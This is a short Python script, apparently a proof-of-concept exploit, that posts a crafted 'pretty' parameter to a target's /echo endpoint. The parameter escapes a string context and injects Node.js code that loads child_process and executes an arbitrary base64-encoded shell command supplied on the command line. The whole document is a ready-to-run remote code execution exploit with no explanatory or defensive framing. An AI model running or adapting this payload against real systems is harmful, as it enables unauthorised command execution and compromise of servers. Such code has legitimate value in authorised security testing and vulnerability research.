import requests
import sys
import base64
from urllib.parse import urljoin

def exploit(target_url, command):
    target_url = urljoin(target_url, '/echo')
    encoded_command = base64.b64encode(command.encode()).decode()
    res = requests.post(target_url, data={
        'pretty': f"');process.mainModule.constructor._load('child_process').exec(Buffer.from('{encoded_command}','base64').toString('ascii'));_=('"
    })
    print(res.text)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('Usage: python3 exploit.py <target_url> <command>')
        exit()

    target_url = sys.argv[1]
    command = sys.argv[2]
    exploit(target_url, command)

